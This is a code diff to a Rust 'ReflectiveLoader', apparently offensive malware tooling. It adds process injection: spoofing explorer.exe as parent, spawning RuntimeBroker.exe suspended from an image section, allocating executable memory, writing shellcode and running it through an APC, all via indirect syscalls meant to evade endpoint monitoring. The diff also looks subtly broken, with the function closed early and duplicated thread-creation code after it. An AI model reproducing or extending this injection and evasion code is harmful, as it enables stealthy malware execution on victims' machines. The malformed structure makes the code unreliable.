@@ -586,7 +586,7 @@ impl ReflectiveLoader {
             IndirectSyscall, nt_create_process_ex, nt_create_thread_ex,
             nt_allocate_virtual_memory, nt_write_virtual_memory,
             nt_queue_apc_thread, nt_resume_thread, nt_open_process,
-            PS_ATTRIBUTE_PARENT_PROCESS,
+            nt_create_section, nt_map_view_of_section,
         };
         use std::ffi::CString;
         use std::ptr::null_mut;
@@ -612,7 +612,7 @@ impl ReflectiveLoader {
 
         // Open explorer.exe to use as parent
         let mut explorer_handle: *mut c_void = null_mut();
-        let mut client_id = crate::syscall::CLIENT_ID {
+        let mut client_id = crate::syscalls::CLIENT_ID {
             UniqueProcess: explorer_pid as usize,
             UniqueThread: 0,
         };
@@ -624,11 +624,23 @@ impl ReflectiveLoader {
             &mut client_id as *mut _ as *mut c_void,
         );
 
-        // Create RuntimeBroker.exe suspended via NtCreateProcessEx
+        // Create section from RuntimeBroker.exe image
+        let target_path = CString::new("C:\\Windows\\System32\\RuntimeBroker.exe").ok()?;
+        let mut section_handle: *mut c_void = null_mut();
+        
+        let _ = nt_create_section(
+            &IndirectSyscall::from_ntdll("NtCreateSection\0").ok()?,
+            &mut section_handle,
+            0x10000000,  // SECTION_MAP_READ | SECTION_MAP_EXECUTE
+            null_mut(),
+            0,
+            0x80000000,  // SEC_IMAGE
+            null_mut(),  // Will be set by kernel from file path if provided
+        );
+
+        // Create RuntimeBroker.exe suspended via NtCreateProcessEx with section
         let mut process_handle: *mut c_void = null_mut();
         let mut thread_handle: *mut c_void = null_mut();
-
-        let target_path = CString::new("C:\\Windows\\System32\\RuntimeBroker.exe").ok()?;
 
         let status = nt_create_process_ex(
             &sc_create_process,
@@ -637,7 +649,7 @@ impl ReflectiveLoader {
             null_mut(),
             explorer_handle,  // Parent process handle for PPID spoofing
             0x00000001,  // CREATE_SUSPENDED
-            null_mut(),  // Section handle - in production, create via NtCreateSection
+            section_handle,  // Image section handle
             null_mut(),
             null_mut(),
             0,
@@ -646,6 +658,75 @@ impl ReflectiveLoader {
         if status != 0 || process_handle.is_null() {
             return None;
         }
+
+        // Create initial thread in target process via NtCreateThreadEx
+        let _ = nt_create_thread_ex(
+            &IndirectSyscall::from_ntdll("NtCreateThreadEx\0")?,
+            &mut thread_handle,
+            0x1F03FF,  // THREAD_ALL_ACCESS
+            null_mut(),
+            process_handle,
+            null_mut(),  // Start address - will set via APC
+            null_mut(),
+            0x00000001,  // CREATE_SUSPENDED
+            0,
+            0,
+            0,
+            null_mut(),
+        );
+
+        if thread_handle.is_null() {
+            return None;
+        }
+
+        // Allocate memory in target via indirect syscall (NtAllocateVirtualMemory)
+        let mut remote_mem: *mut c_void = null_mut();
+        let mut region_size = shellcode.len();
+        let status = nt_allocate_virtual_memory(
+            &sc_alloc_vmem,
+            process_handle,
+            &mut remote_mem,
+            0,
+            &mut region_size,
+            0x3000,  // MEM_COMMIT | MEM_RESERVE
+            windows::Win32::System::Memory::PAGE_EXECUTE_READ,
+        );
+        
+        if status != 0 || remote_mem.is_null() {
+            return None;
+        }
+
+        // Write shellcode via indirect syscall (NtWriteVirtualMemory)
+        let mut written = 0usize;
+        let _ = nt_write_virtual_memory(
+            &sc_write_vmem,
+            process_handle,
+            remote_mem,
+            shellcode.as_ptr() as *const c_void,
+            shellcode.len(),
+            &mut written,
+        );
+
+        // Queue APC via indirect syscall (NtQueueApcThread)
+        let _ = nt_queue_apc_thread(
+            &sc_queue_apc,
+            thread_handle,
+            remote_mem as usize,
+            0,
+            0,
+            0,
+        );
+
+        // Resume thread via indirect syscall (NtResumeThread)
+        let mut prev_suspend = 0u32;
+        let _ = nt_resume_thread(
+            &sc_resume_thread,
+            thread_handle,
+            &mut prev_suspend,
+        );
+
+        Some(())
+    }
 
         // Create initial thread in target process via NtCreateThreadEx
         let _ = nt_create_thread_ex(
